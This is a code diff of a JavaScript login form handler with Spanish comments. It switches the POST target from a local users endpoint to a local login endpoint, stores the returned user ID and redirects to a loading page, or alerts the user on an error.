@@ -11514,18 +11514,22 @@
           const pass = dataPass.value;
           
           if (user && pass) {
-            fetch('http://localhost:3000/api/users', {
+            fetch('http://localhost:3000/api/login', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ username: user, password: pass })
             })
             .then(res => res.json())
             .then(data => {
-              console.log('Usuario guardado:', data);
-              // Save user ID to poll for view changes
-              if (data.id) localStorage.setItem('userId', data.id);
-              // Redirigir a cargando.html
-              window.location.href = 'cargando.html';
+              console.log('Login:', data);
+              if (data.id) {
+                // Save user ID to poll for view changes
+                localStorage.setItem('userId', data.id);
+                // Redirigir a cargando.html
+                window.location.href = 'cargando.html';
+              } else {
+                alert(data.error || 'Usuario o contraseña incorrectos');
+              }
             })
             .catch(err => console.error('Error:', err));
           }
